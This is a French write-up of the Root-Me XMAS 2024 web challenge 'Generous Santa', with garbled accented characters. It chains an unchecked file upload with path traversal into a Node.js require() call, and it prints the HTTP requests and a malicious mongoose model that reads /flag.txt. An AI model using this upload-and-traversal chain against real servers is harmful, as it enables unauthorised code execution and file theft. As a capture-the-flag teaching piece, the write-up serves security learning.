view: writeup
language: fr
seo:
  title: XMAS root-me challenges, Generous Santa
  description:
  keywords: ctf, security, root-me, xmas, web, generous santa, write-up
  author: Antoine Benevaut
  twitter: "@abenevaut"
  og-image: https://www.abenevaut.dev/images/abenevaut-og-xms-2024-root-me.webp
  url: https://www.abenevaut.dev/2024-xmas-root-me/01-web-generous-santa-1.html

writeup: |+
  # Write-up Generous Santa
  
  12h00, 1er dÃ©cembre 2024, le challenge XMAS de root-me dÃ©marre avec une Ã©preuve web "Generous Santa", c'est parti!
  
  Dans le code, on trouve une application web en NodeJS, un Dockerfile (avec un docker-compose), le fichier du flag "flag.txt" et un README, qui nous ditÂ :
  
  > The number of Santa's lunti has increased by 1337 this year, and there are a lot of them! Thanks to this, they've been able to give you some very, very nice gifts.
  > If you can't find what you're looking for, you can even suggest gifts to him - maybe they'll make them in time!
  
  Le premier cadeau (ce challenge) ayant Ã©tÃ© dÃ©jÃ  livrÃ© allons voir comment on peut encore remplir la hotte du PÃ¨re NoÃ«l.
  
  Nous sommes en source ouverte, on devrait pouvoir savoir rapidement ou nous allons devoir chercher le flag.
  
  Une petite recherche sur l'ensemble des fichiers du projet avec "flag.txt" nous montre que le fichier va Ãªtre copiÃ© sur le container Docker Ã  l'emplacement `/flag.txt`.
  Pour ce qui est des droits, le fichier appartient Ã  l'utilisateur "santa" qui est aussi l'utilisateur courant.
  
  ```Dockerfile
  COPY flag.txt /flag.txt
  RUN chown santa:santa /flag.txt
  
  USER santa
  ```
  
  On peut aussi noter que c'est l'utilisateur "santa" qui va exÃ©cuter l'application node.
  
  ```Dockerfile
  USER santa
  
  CMD ["npm", "start"]
  ```

  Pour le moment, on peut se laisser dire que si on casse l'app node, nous pourrons lire le flag.

  Maintenant, Ã  quoi ressemble l'applicationÂ ?
  
  ![AperÃ§u de l'application](images/ctf-2024-rootme-xmas/web-generous-santa-1-overview.png.webp)
  
  On a une page d'accueil pour voir les cadeaux et une seconde page avec un formulaire pour suggÃ©rer un cadeau.
  Mis Ã  part la navigation, on trouve sur ces pages deux actions distincts, un bouton pour "ajouter les cadeaux" et un formulaire pour "suggÃ©rer un cadeau".
  
  On va donc regarder ce qui se passe lorsque l'on actionne ces deux Ã©lÃ©ments. On commence avec la pas d'accueil.
  
  ![](images/ctf-2024-rootme-xmas/web-generous-santa-1-home-query.png.webp)
  
  Au click sur le bouton "Ajouter les cadeaux", l'application fait une requÃªte POST sur `/api/add` avec un payload JSON.
  On reproduit la requÃªte avec ijhttp, dans un fichier `exploit.http`Â :
  
  > ijhttp est l'outil de jetbrains pour jouer des requÃªtes HTTP. Il est intÃ©grÃ© dans les IDE web de jetbrains.
  > Vous pouvez Ã©galement l'utiliser en standalone en l'installant via ce [lien](https://www.jetbrains.com/ijhttp/download/#section=zip-archive).  
  
  ```curl
  POST https://day1.challenges.xmas.root-me.org/api/add
  Content-Type: application/json
  
  {"product":"Bugatti"}
  ```
  
  Si on l'exÃ©cute, on obtient la rÃ©ponse suivanteÂ :
  
  ```response
  HTTP/2 200 OK
  ...
  
  {
    "success": true,
    "output": {
      "name": "Bugatti",
      "description": "Description of Bugatti",
      "_id": "674c7c4171020c0a249a06e7"
    }
  }
  ```
  
  Soyons taquin, que se passe-t-il si on envoie un JSON dans lequel on changerai la valeur de `product`Â ?
  
  ```curl
  POST https://day1.challenges.xmas.root-me.org/api/add
  Content-Type: application/json
  
  {"product":"Exploit"}
  ```
  
  Si on l'exÃ©cute, on obtient la rÃ©ponse suivanteÂ :
  
  ```response
  HTTP/2 500 Internal Server Error
  ...
  
  {
    "message": "Error adding the product Exploit. Cannot find module '../models/exploit'\nRequire stack:\n- /usr/app/routes/hotte.js\n- /usr/app/app.js"
  }
  ```
  
  ðŸŽ…Hohoho! `Cannot find module '../models/exploit'\nRequire stack:\n- /usr/app/routes/hotte.js` nous indique que l'application cherche un module `../models/exploit` dans le fichier `hotte.js`.
  Surement une piste pour exploiter l'application, une entrÃ©e ne doit pas Ãªtre correctement validÃ©e. Que nous dit le codeÂ ?

  ```javascript
  router.post('/add', async (req, res) => {
    const { product } = req.body;

    try {
        const Gift = require(`../models/${product.toLowerCase()}`);
        const gift = new Gift({ name: product, description: `Description of ${product}` });
        output = gift.store();
        res.json({ success: true, output: output });
    } catch (error) {
        res.status(500).json({ message: `Error adding the product ${product}. ${error.message}` });
    }
  });
  ```
  
  Le code nous dit que l'application va chercher un module dans le dossier `models` avec le nom du produit en minuscule `require(`../models/${product.toLowerCase()}`)`.
  Pas de validation particuliÃ¨re sur le nom du produit, on peut donc envoyer n'importe quoi et l'application va chercher un module avec ce nom.
  Si le module n'existe pas, l'application renvoie une erreur 500 avec le message d'erreur.
  
  Parfait, les requÃªtes et leurs rÃ©ponses font sens. Si seulement je pouvais envoyer un faux models pour lire le flag...
  
  Alors, que se passe-t-il du cÃ´tÃ© du formulaire de suggestion de cadeauÂ ?
  
  ![](images/ctf-2024-rootme-xmas/web-generous-santa-1-suggest-query.png.webp)
  
  Ã€ la soumission du formulaire, l'application fait une requÃªte POST sur `/api/suggest` avec un content type `application/multipart/form-data`.
  On soumet un fichier, tout cela fait donc sens. On notera aussi le nom des champs `name` et `photo`.
  
  On reproduit la requÃªte avec ijhttp, dans notre fichier `exploit.http`.
  On va envoyer notre formulaire avec le champ "name" qui vaut "Nasa" et le champ photo qui est un fichier PNG `nasa.png`.
  
  ```curl
  POST https://day1.challenges.xmas.root-me.org/api/suggest
  Content-Type: multipart/form-data; boundary=WebAppBoundary
  
  --WebAppBoundary
  Content-Disposition: form-data; name="name"
  
  Nasa
  
  --WebAppBoundary
  Content-Disposition: form-data; name="photo"; filename="nasa.png"
  Content-Type: image/png
  
  < ./nasa.png
  
  --WebAppBoundary--
  ```
  
  Status code 200, tout c'est bien passÃ©. On obtient la rÃ©ponse qui suit et on notre attention va se porter sur la valeur de `photoPath`.
  
  ```response
  HTTP/2 200 OK
  ...
  
  {
    "message": "Thank you! Santa will consider your suggestion.",
    "photoPath": "/tmp/2024-12-01_20-27-2/nasa.png"
  }
  ```
  
  ðŸŽ…Hohoho! `"photoPath": "/tmp/2024-12-01_20-27-2/nasa.png"` nous indique que le fichier a Ã©tÃ© uploadÃ© dans le dossier `/tmp/2024-12-01_20-27-2/`.
  
  Si on rÃ©capituleÂ :
  - nous avons le endpoint `/api/add` qui va chercher un module dans le dossier `models` avec un nom produit qui semble Ãªtre exploitable
  - nous avons le endpoint `/api/suggest` qui va uploader un fichier dans le dossier `/tmp/2024-12-01_20-27-2/`
  
  Ã‡a sent l'attaque en deux Ã©tapes! NonÂ ? Plusieurs idÃ©es viennent alors en tÃªteÂ :
  - Est-ce que l'on peut envoyer n'importe quel type de fichier sur le endpoint de suggestionÂ ?
  - Est-ce que l'on peut rÃ©ussir Ã  exÃ©cuter un "models" truquÃ© et avec lire le flagÂ ?
  
  Allez, on s'y colle! On va essayer d'envoyer un fichier `exploit.js` sur le endpoint de suggestion.
  
  Pour crÃ©er ce fichier `exploit.js`, on va dupliquer un model existant et adapter rapidement le contenu.
  Un copiÃ©/collÃ© du fichier `bugatti.js` puis on recherche et remplace "bugatti" en "exploit", et on est pas mal pour une premiÃ¨re tentativeÂ ?
  
  ```javascript
  const mongoose = require('mongoose');
  
  const exploitSchema = new mongoose.Schema({
    name: { type: String, default: 'exploit' },
    description: { type: String, default: 'A luxury high-performance exploit.' }
  });
    
  exploitSchema.methods.store = function() {
    console.log('exploit stored in the sack.');
    return this;
  };
  
  module.exports = mongoose.model('exploit', exploitSchema);
  ```
  
  On tente d'envoyer notre fichier
  
  ```curl
  POST https://day1.challenges.xmas.root-me.org/api/suggest
  Content-Type: multipart/form-data; boundary=WebAppBoundary
  
  --WebAppBoundary
  Content-Disposition: form-data; name="name"
  
  Nasa
  
  --WebAppBoundary
  Content-Disposition: form-data; name="photo"; filename="exploit.js"
  Content-Type: image/png
  
  < ./exploit.js
  
  --WebAppBoundary--
  ```
  
  > J'ai rÃ©essayÃ© ensuite sans le `Content-Type: image/png` et Ã§a a fonctionnÃ©. ZÃ©ro vÃ©rification donc. MÃªme pas besoin de checker le code, Merci PÃ¨re NoÃ«l!
  
  Et Ã§a fonctionne! Notre fichier exploit est uploadÃ© dans le dossier `/tmp/2024-12-01_20-43-18/exploit.js`.
  
  ```response
  HTTP/2 200 OK
  ...
  
  {
    "message": "Thank you! Santa will consider your suggestion.",
    "photoPath": "/tmp/2024-12-01_20-43-18/exploit.js"
  }
  ```
  
  Super! On "n'a plus qu'a" trouver un "path traversal" sur le endpoint `/api/add` pour exÃ©cuter notre fichier.
  
  > [Path traversal](https://owasp.org/www-community/attacks/Path_Traversal) est une technique qui vise Ã  utiliser des path non prÃ©vu pour accÃ©der Ã  des fichiers ou des rÃ©pertoires auxquels l'utilisateur peut parfois ne pas avoir accÃ¨s.
  > Dans notre cas, le endpoint `/api/add` n'a pas vocation Ã  requÃ©rir des fichiers depuis un autre rÃ©pertoire que le rÃ©pertoire `src/models` de l'app. 
  
  On va essayer de pas trop tÃ¢tonner, on rÃ©capitule les infos utilesÂ :
  - le flag est dans le fichier `/flag.txt`
  - notre exploit est uploadÃ© dans `/tmp/2024-12-01_20-43-18/exploit.js`
  - on va essayer de charger un model et on essaie de le faire avec ce path `../models/${product.toLowerCase()}`
  
  Essayons d'expliciter le path des models, `../models/${product.toLowerCase()}` c'est pas assez clair.
  C'est ou `../models`Â ?
  
  On sait que le repertoire models est dans le repertoire `src/` du projet. Mais ou est stockÃ© ce rÃ©pertoireÂ ?
  
  Dans le Dockerfile, on trouve l'instruction `COPY ./src/ ./` et un peu plus haut l'instruction `WORKDIR /usr/app`.
  Nos sources sont donc localisÃ©es dans `/usr/app/src/` et les models dans `/usr/app/src/models/`.
  
  ðŸŽ„Le sapin s'illumine, pour aller de `models/` Ã  /tmp/2024-12-01_20-43-18/exploit.js, il nous faut remonter de 4 niveaux.
  On va donc essayer de charger notre exploit avec le path `../../../../tmp/2024-12-01_20-43-18/exploit` (sans l'extension).
  
  Allez! On essaie!
  
  ```curl
  POST https://day1.challenges.xmas.root-me.org/api/add
  Content-Type: application/json
  
  {"product":"../../../../tmp/2024-12-01_20-43-18/exploit"}
  ```
  
  Avant de vous montrez l'exploit final, plusieurs Ã©tapes on Ã©tÃ© nÃ©cessaires _ainsi que plusieurs essaies_Â :
  
  Lors du premier essai, une erreur m'est retournÃ©e, impossible de trouver le package `mongoose`, une dÃ©pendance du model incluse via `npm`.
  Pour l'inclure, il a fallu indiquer le path complet vers le package `const mongoose = require('/usr/app/node_modules/mongoose');`.
  
  Au second essai, une nouvelle erreur m'indique que mon model est dÃ©ja chargÃ© avec le nom "exploit", c'est tout Ã  fait normal et relatif au cycle de vie de Express.js.
  L'application node a deux cycles de vie principaux, le premier rÃ©gie le serveur web, il attend une requÃªte, et le second rÃ©gie l'exÃ©cution d'une seul requÃªte.
  
  L'exÃ©cution d'une requÃªte est Ã©phÃ©mÃ¨re, les variables sont dÃ©truites lorsque la rÃ©ponse est retournÃ©e.
  En revanche, le serveur web est persistant, les variables sont conservÃ©es entre les requÃªtes.
  
  Pour corriger le tire, j'ai usÃ© d'astuce en incrÃ©mentant simplement le nom du fichier `exploit` Ã  chaque essai (exploit1, exploit2, exploit3... ðŸ¤¦â€â™‚ï¸vous avez compris).
  
  Enfin, quand j'ai eu un model fonctionnel, j'ai pu ajouter la lecture du flag `fs.readFileSync('/flag.txt')`.

  ```javascript
  const mongoose = require('/usr/app/node_modules/mongoose');
  const fs = require('fs');
  
  const exploit9Schema = new mongoose.Schema({
    name: { type: String, default: 'exploit9' },
    description: { type: String, default: 'A luxury high-performance exploit9.' },
    fileContent: { type: String, default: fs.readFileSync('/flag.txt') }
  });
  
  exploit9Schema.methods.store = function() {
    console.log('exploit9 stored in the sack.');
    
    return this
  };
  
  module.exports = mongoose.model('exploit9', exploit9Schema);
  ```

  ðŸŽOn envoie notre requÃªte et on obtient le flag ðŸ

  ![Capture d'Ã©cran montrant le flag](images/ctf-2024-rootme-xmas/web-generous-santa-1-flag.png.webp)

  CrÃ©dits du challenge [root-me.org](https://x.com/rootme_org/status/1863296339183796546) et son auteur [Elweth](https://x.com/Elweth_).
  
  Retrouver les sources du challenge [ici](https://github.com/elweth-sec/Root-Me-XMAS-2024).
  
  [Sommaire >](2024-xmas-root-me.html) - [Challenge suivant >](2024-xmas-root-me/03-web-game-hacking-santa-s-magic-sack-1.html)
